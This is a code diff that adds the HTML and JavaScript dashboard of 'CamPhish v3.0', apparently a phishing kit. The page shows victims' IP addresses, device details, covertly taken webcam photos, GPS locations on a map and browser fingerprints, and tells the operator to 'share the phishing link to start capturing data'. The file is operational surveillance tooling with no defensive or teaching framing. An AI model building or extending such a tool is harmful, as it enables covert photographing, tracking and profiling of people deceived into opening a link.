@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CamPhish v3.0 - Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0f0f0f;
+            color: #fff;
+            overflow-x: hidden;
+        }
+
+        .sidebar {
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 260px;
+            height: 100vh;
+            background: #1a1a1a;
+            border-right: 1px solid #2a2a2a;
+            padding: 30px 0;
+            z-index: 100;
+        }
+
+        .logo {
+            padding: 0 30px 30px;
+            border-bottom: 1px solid #2a2a2a;
+        }
+
+        .logo h1 {
+            font-size: 24px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .logo p {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        .nav-menu {
+            margin-top: 30px;
+        }
+
+        .nav-item {
+            padding: 15px 30px;
+            color: #999;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .nav-item:hover {
+            background: rgba(102, 126, 234, 0.1);
+            color: #667eea;
+        }
+
+        .nav-item.active {
+            background: rgba(102, 126, 234, 0.15);
+            color: #667eea;
+            border-left: 3px solid #667eea;
+        }
+
+        .nav-icon {
+            font-size: 18px;
+        }
+
+        .main-content {
+            margin-left: 260px;
+            padding: 30px;
+            min-height: 100vh;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .header h2 {
+            font-size: 28px;
+            font-weight: 700;
+        }
+
+        .refresh-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+
+        .refresh-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: #1a1a1a;
+            border-radius: 12px;
+            padding: 24px;
+            border: 1px solid #2a2a2a;
+        }
+
+        .stat-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .stat-title {
+            color: #999;
+            font-size: 14px;
+        }
+
+        .stat-icon {
+            font-size: 24px;
+        }
+
+        .stat-value {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .stat-change {
+            font-size: 12px;
+            color: #4ade80;
+        }
+
+        .stat-change.negative {
+            color: #f87171;
+        }
+
+        .content-grid {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .card {
+            background: #1a1a1a;
+            border-radius: 12px;
+            padding: 24px;
+            border: 1px solid #2a2a2a;
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .section {
+            display: none;
+        }
+
+        .section.active {
+            display: block;
+        }
+
+        #map {
+            height: 400px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+
+        .session-item {
+            background: #222;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 12px;
+            border: 1px solid #2a2a2a;
+        }
+
+        .session-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .session-ip {
+            color: #667eea;
+            font-weight: 600;
+        }
+
+        .session-time {
+            color: #999;
+            font-size: 12px;
+        }
+
+        .session-details {
+            color: #999;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+
+        .activity-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 15px;
+            background: #222;
+            border-radius: 8px;
+            margin-bottom: 10px;
+        }
+
+        .activity-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .activity-content {
+            flex: 1;
+        }
+
+        .activity-title {
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .activity-details {
+            color: #999;
+            font-size: 12px;
+        }
+
+        .activity-time {
+            color: #666;
+            font-size: 12px;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #666;
+        }
+
+        .empty-state-icon {
+            font-size: 64px;
+            margin-bottom: 16px;
+        }
+
+        .empty-state-text {
+            font-size: 18px;
+            margin-bottom: 8px;
+        }
+
+        .empty-state-subtext {
+            font-size: 14px;
+        }
+
+        .capture-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .capture-item {
+            position: relative;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid #2a2a2a;
+        }
+
+        .capture-item img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+
+        .capture-info {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
+            padding: 12px;
+            color: white;
+            font-size: 12px;
+        }
+
+        @media (max-width: 768px) {
+            .sidebar {
+                width: 0;
+                overflow: hidden;
+            }
+            
+            .main-content {
+                margin-left: 0;
+            }
+            
+            .content-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="sidebar">
+        <div class="logo">
+            <h1>CamPhish</h1>
+            <p>v3.0 Professional</p>
+        </div>
+        
+        <div class="nav-menu">
+            <div class="nav-item active" onclick="showSection('overview')">
+                <span class="nav-icon">📊</span>
+                <span>Overview</span>
+            </div>
+            <div class="nav-item" onclick="showSection('sessions')">
+                <span class="nav-icon">👥</span>
+                <span>Sessions</span>
+            </div>
+            <div class="nav-item" onclick="showSection('locations')">
+                <span class="nav-icon">📍</span>
+                <span>Locations</span>
+            </div>
+            <div class="nav-item" onclick="showSection('captures')">
+                <span class="nav-icon">📸</span>
+                <span>Captures</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <!-- Overview Section -->
+        <div id="overview" class="section active">
+            <div class="header">
+                <h2>📊 Dashboard Overview</h2>
+                <button class="refresh-btn" onclick="loadData()">🔄 Refresh</button>
+            </div>
+
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-header">
+                        <span class="stat-title">Total Sessions</span>
+                        <span class="stat-icon">👥</span>
+                    </div>
+                    <div class="stat-value" id="totalSessions">0</div>
+                    <div class="stat-change" id="sessionsChange">No data yet</div>
+                </div>
+
+                <div class="stat-card">
+                    <div class="stat-header">
+                        <span class="stat-title">Photos Captured</span>
+                        <span class="stat-icon">📸</span>
+                    </div>
+                    <div class="stat-value" id="totalCaptures">0</div>
+                    <div class="stat-change" id="capturesChange">No data yet</div>
+                </div>
+
+                <div class="stat-card">
+                    <div class="stat-header">
+                        <span class="stat-title">GPS Locations</span>
+                        <span class="stat-icon">📍</span>
+                    </div>
+                    <div class="stat-value" id="totalLocations">0</div>
+                    <div class="stat-change" id="locationsChange">No data yet</div>
+                </div>
+
+                <div class="stat-card">
+                    <div class="stat-header">
+                        <span class="stat-title">Fingerprints</span>
+                        <span class="stat-icon">🔍</span>
+                    </div>
+                    <div class="stat-value" id="totalFingerprints">0</div>
+                    <div class="stat-change" id="fingerprintsChange">No data yet</div>
+                </div>
+            </div>
+
+            <div class="content-grid">
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">Recent Activity</h3>
+                    </div>
+                    <div id="activityList">
+                        <div class="empty-state">
+                            <div class="empty-state-icon">⏳</div>
+                            <div class="empty-state-text">Waiting for activity</div>
+                            <div class="empty-state-subtext">Share the phishing link to start capturing data</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">Latest Sessions</h3>
+                    </div>
+                    <div id="latestSessions">
+                        <div class="empty-state">
+                            <div class="empty-state-icon">👥</div>
+                            <div class="empty-state-text">No sessions yet</div>
+                            <div class="empty-state-subtext">Sessions will appear here</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Sessions Section -->
+        <div id="sessions" class="section">
+            <div class="header">
+                <h2>👥 All Sessions</h2>
+                <button class="refresh-btn" onclick="loadData()">🔄 Refresh</button>
+            </div>
+            <div id="sessionsList">
+                <div class="empty-state">
+                    <div class="empty-state-icon">👥</div>
+                    <div class="empty-state-text">No sessions captured yet</div>
+                    <div class="empty-state-subtext">Sessions will appear here when visitors access your link</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Locations Section -->
+        <div id="locations" class="section">
+            <div class="header">
+                <h2>📍 GPS Locations</h2>
+                <button class="refresh-btn" onclick="loadData()">🔄 Refresh</button>
+            </div>
+            <div class="card">
+                <div id="map"></div>
+            </div>
+            <div id="locationsList" style="margin-top: 20px;">
+                <div class="empty-state">
+                    <div class="empty-state-icon">📍</div>
+                    <div class="empty-state-text">No locations captured yet</div>
+                    <div class="empty-state-subtext">Locations will be shown on the map when captured</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Captures Section -->
+        <div id="captures" class="section">
+            <div class="header">
+                <h2>📸 Photo Captures</h2>
+                <button class="refresh-btn" onclick="loadData()">🔄 Refresh</button>
+            </div>
+            <div id="capturesGrid">
+                <div class="empty-state">
+                    <div class="empty-state-icon">📸</div>
+                    <div class="empty-state-text">No photos captured yet</div>
+                    <div class="empty-state-subtext">Photos will appear here when webcam access is granted</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let map = null;
+        let sessionsData = {};
+        let mapMarkers = [];
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            initMap();
+            loadData();
+            // Auto-refresh every 5 seconds
+            setInterval(loadData, 5000);
+        });
+
+        function initMap() {
+            map = L.map('map').setView([20, 0], 2);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '© OpenStreetMap contributors'
+            }).addTo(map);
+        }
+
+        function showSection(sectionName) {
+            // Hide all sections
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            
+            // Show selected section
+            document.getElementById(sectionName).classList.add('active');
+            event.target.closest('.nav-item').classList.add('active');
+        }
+
+        async function loadData() {
+            try {
+                const response = await fetch('sessions.json');
+                const data = await response.json();
+                sessionsData = data;
+                
+                updateStats();
+                updateActivity();
+                updateSessions();
+                updateLocations();
+                updateCaptures();
+            } catch (error) {
+                console.log('No data yet or error loading:', error);
+            }
+        }
+
+        function updateStats() {
+            const sessions = Object.values(sessionsData);
+            const totalSessions = sessions.length;
+            
+            let totalCaptures = 0;
+            let totalLocations = 0;
+            let totalFingerprints = 0;
+            
+            sessions.forEach(session => {
+                totalCaptures += (session.captures || []).length;
+                totalLocations += (session.locations || []).length;
+                if (session.fingerprint) totalFingerprints++;
+            });
+            
+            document.getElementById('totalSessions').textContent = totalSessions;
+            document.getElementById('totalCaptures').textContent = totalCaptures;
+            document.getElementById('totalLocations').textContent = totalLocations;
+            document.getElementById('totalFingerprints').textContent = totalFingerprints;
+            
+            document.getElementById('sessionsChange').textContent = totalSessions > 0 ? 'Active' : 'No data yet';
+            document.getElementById('capturesChange').textContent = totalCaptures > 0 ? `${totalCaptures} captured` : 'No captures';
+            document.getElementById('locationsChange').textContent = totalLocations > 0 ? `${totalLocations} tracked` : 'No locations';
+            document.getElementById('fingerprintsChange').textContent = totalFingerprints > 0 ? `${totalFingerprints} collected` : 'No fingerprints';
+        }
+
+        function updateActivity() {
+            const sessions = Object.values(sessionsData);
+            const activities = [];
+            
+            sessions.forEach(session => {
+                // Add visit activity
+                activities.push({
+                    icon: '👁️',
+                    title: 'New Visit',
+                    details: `${session.ip_address} - ${session.device_info?.browser || 'Unknown'} / ${session.device_info?.os || 'Unknown'}`,
+                    time: formatTime(session.first_visit),
+                    color: '#667eea'
+                });
+                
+                // Add capture activities
+                (session.captures || []).forEach(capture => {
+                    activities.push({
+                        icon: '📸',
+                        title: 'Photo Captured',
+                        details: `${capture.filename} - ${formatBytes(capture.size)}`,
+                        time: formatTime(capture.timestamp),
+                        color: '#4ade80'
+                    });
+                });
+                
+                // Add location activities
+                (session.locations || []).forEach(location => {
+                    activities.push({
+                        icon: '📍',
+                        title: 'Location Tracked',
+                        details: `${location.latitude.toFixed(4)}, ${location.longitude.toFixed(4)} (±${location.accuracy}m)`,
+                        time: formatTime(location.timestamp),
+                        color: '#fbbf24'
+                    });
+                });
+            });
+            
+            // Sort by time (most recent first)
+            activities.sort((a, b) => new Date(b.time) - new Date(a.time));
+            
+            const activityList = document.getElementById('activityList');
+            if (activities.length === 0) {
+                activityList.innerHTML = `
+                    <div class="empty-state">
+                        <div class="empty-state-icon">⏳</div>
+                        <div class="empty-state-text">Waiting for activity</div>
+                        <div class="empty-state-subtext">Share the phishing link to start capturing data</div>
+                    </div>
+                `;
+            } else {
+                activityList.innerHTML = activities.slice(0, 10).map(activity => `
+                    <div class="activity-item">
+                        <div class="activity-icon" style="background: ${activity.color}22; color: ${activity.color};">
+                            ${activity.icon}
+                        </div>
+                        <div class="activity-content">
+                            <div class="activity-title">${activity.title}</div>
+                            <div class="activity-details">${activity.details}</div>
+                        </div>
+                        <div class="activity-time">${getTimeAgo(activity.time)}</div>
+                    </div>
+                `).join('');
+            }
+            
+            // Update latest sessions
+            const latestSessions = document.getElementById('latestSessions');
+            if (sessions.length === 0) {
+                latestSessions.innerHTML = `
+                    <div class="empty-state">
+                        <div class="empty-state-icon">👥</div>
+                        <div class="empty-state-text">No sessions yet</div>
+                        <div class="empty-state-subtext">Sessions will appear here</div>
+                    </div>
+                `;
+            } else {
+                latestSessions.innerHTML = sessions.slice(0, 5).map(session => `
+                    <div class="session-item">
+                        <div class="session-header">
+                            <span class="session-ip">${session.ip_address}</span>
+                            <span class="session-time">${getTimeAgo(session.first_visit)}</span>
+                        </div>
+                        <div class="session-details">
+                            ${session.device_info?.device_brand || 'Unknown'} • ${session.device_info?.browser || 'Unknown'}<br>
+                            📸 ${(session.captures || []).length} • 📍 ${(session.locations || []).length}
+                        </div>
+                    </div>
+                `).join('');
+            }
+        }
+
+        function updateSessions() {
+            const sessions = Object.values(sessionsData);
+            const sessionsList = document.getElementById('sessionsList');
+            
+            if (sessions.length === 0) {
+                sessionsList.innerHTML = `
+                    <div class="empty-state">
+                        <div class="empty-state-icon">👥</div>
+                        <div class="empty-state-text">No sessions captured yet</div>
+                        <div class="empty-state-subtext">Sessions will appear here when visitors access your link</div>
+                    </div>
+                `;
+                return;
+            }
+            
+            sessionsList.innerHTML = sessions.map(session => `
+                <div class="session-item">
+                    <div class="session-header">
+                        <span class="session-ip">${session.ip_address}</span>
+                        <span class="session-time">${session.first_visit}</span>
+                    </div>
+                    <div class="session-details">
+                        <strong>Device:</strong> ${session.device_info?.device_brand || 'Unknown'}<br>
+                        <strong>OS:</strong> ${session.device_info?.os || 'Unknown'}<br>
+                        <strong>Browser:</strong> ${session.device_info?.browser || 'Unknown'} ${session.device_info?.browser_version || ''}<br>
+                        <strong>Type:</strong> ${session.device_info?.device_type || 'Unknown'}<br>
+                        <strong>User Agent:</strong> ${session.user_agent}<br>
+                        <strong>Captures:</strong> ${(session.captures || []).length} photos<br>
+                        <strong>Locations:</strong> ${(session.locations || []).length} GPS points<br>
+                        <strong>Fingerprint:</strong> ${session.fingerprint ? `✓ (${session.fingerprint.confidence}% confidence)` : '✗'}
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function updateLocations() {
+            const sessions = Object.values(sessionsData);
+            let allLocations = [];
+            
+            sessions.forEach(session => {
+                (session.locations || []).forEach(location => {
+                    allLocations.push({
+                        ...location,
+                        ip: session.ip_address
+                    });
+                });
+            });
+            
+            // Clear existing markers
+            mapMarkers.forEach(marker => map.removeLayer(marker));
+            mapMarkers = [];
+            
+            if (allLocations.length > 0) {
+                // Add markers to map
+                allLocations.forEach(loc => {
+                    const marker = L.marker([loc.latitude, loc.longitude]).addTo(map)
+                        .bindPopup(`
+                            <b>${loc.ip}</b><br>
+                            ${loc.timestamp}<br>
+                            Accuracy: ±${loc.accuracy}m<br>
+                            <a href="${loc.google_maps}" target="_blank">View in Google Maps</a>
+                        `);
+                    mapMarkers.push(marker);
+                });
+                
+                // Fit map to markers
+                if (allLocations.length > 1) {
+                    const bounds = L.latLngBounds(allLocations.map(loc => [loc.latitude, loc.longitude]));
+                    map.fitBounds(bounds);
+                } else {
+                    map.setView([allLocations[0].latitude, allLocations[0].longitude], 13);
+                }
+                
+                document.getElementById('locationsList').innerHTML = '';
+            } else {
+                document.getElementById('locationsList').innerHTML = `
+                    <div class="empty-state">
+                        <div class="empty-state-icon">📍</div>
+                        <div class="empty-state-text">No locations captured yet</div>
+                        <div class="empty-state-subtext">Locations will be shown on the map when captured</div>
+                    </div>
+                `;
+            }
+        }
+
+        function updateCaptures() {
+            const sessions = Object.values(sessionsData);
+            let allCaptures = [];
+            
+            sessions.forEach(session => {
+                (session.captures || []).forEach(capture => {
+                    allCaptures.push({
+                        ...capture,
+                        ip: session.ip_address
+                    });
+                });
+            });
+            
+            const capturesGrid = document.getElementById('capturesGrid');
+            
+            if (allCaptures.length === 0) {
+                capturesGrid.innerHTML = `
+                    <div class="empty-state">
+                        <div class="empty-state-icon">📸</div>
+                        <div class="empty-state-text">No photos captured yet</div>
+                        <div class="empty-state-subtext">Photos will appear here when webcam access is granted</div>
+                    </div>
+                `;
+            } else {
+                capturesGrid.innerHTML = `<div class="capture-grid">` + 
+                    allCaptures.map(capture => `
+                        <div class="capture-item">
+                            <img src="${capture.path}" alt="${capture.filename}">
+                            <div class="capture-info">
+                                <div>${capture.filename}</div>
+                                <div>${formatBytes(capture.size)} • ${getTimeAgo(capture.timestamp)}</div>
+                            </div>
+                        </div>
+                    `).join('') + 
+                `</div>`;
+            }
+        }
+
+        function formatBytes(bytes) {
+            if (!bytes) return '0 B';
+            const k = 1024;
+            const sizes = ['B', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
+        }
+
+        function formatTime(timestamp) {
+            if (!timestamp) return 'Unknown';
+            return timestamp;
+        }
+
+        function getTimeAgo(timestamp) {
+            if (!timestamp) return 'Unknown';
+            const now = new Date();
+            const then = new Date(timestamp);
+            const seconds = Math.floor((now - then) / 1000);
+            
+            if (seconds < 60) return seconds + 's ago';
+            if (seconds < 3600) return Math.floor(seconds / 60) + 'm ago';
+            if (seconds < 86400) return Math.floor(seconds / 3600) + 'h ago';
+            return Math.floor(seconds / 86400) + 'd ago';
+        }
+    </script>
+</body>
+</html>
